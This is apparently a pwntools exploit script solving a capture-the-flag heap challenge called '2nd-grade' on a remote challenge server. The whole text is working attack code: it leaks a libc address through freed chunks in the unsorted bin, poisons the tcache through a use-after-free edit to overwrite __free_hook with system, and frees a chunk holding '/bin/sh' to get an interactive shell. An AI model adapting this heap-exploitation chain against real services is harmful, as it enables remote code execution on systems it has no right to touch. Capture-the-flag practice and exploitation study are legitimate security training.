from pwn import * 
#context.log_level = 'debug'
#r = process('./2nd-grade')
#r = gdb.debug('./2nd-grade', 'b *0x55555555551d\nc')
r = remote('0.cloud.chals.io', 34164)
libc = ELF('./libc.so.6')

def sendi(i):
    r.sendlineafter(b'Index? \n', str(i).encode())
def sendo(o):
    r.sendlineafter(b'Choose an option:\n', str(o).encode())
def malloc(i):
    sendo(1)
    sendi(i)
def edit(i, content):
    sendo(2)
    sendi(i)
    r.sendlineafter(b'Content? ', content)
def view(i):
    sendo(4)
    sendi(i)
    return r.recvline(keepends=False)
def free(i): 
    sendo(3)
    sendi(i) 

for i in range(0, 10+1): malloc(i)
for i in range(0, 7+1): free(i)
leak = view(7)
print('leak', leak.hex())
libc.address = u64(leak+b'\x00\x00') - (libc.sym['main_arena'] + 96)
print(f'libc.address = {hex(libc.address)}')
assert libc.address & 0xfff == 0
target = libc.sym['__free_hook']
target_val = libc.sym['system']

for i in range(7+1, 10+1): free(i)

malloc(0)
malloc(1)
free(0)
free(1)
edit(1, p64(target))
malloc(0)
malloc(1)
edit(1, p64(target_val))

edit(0, b'/bin/sh\x00')
free(0)

r.interactive()

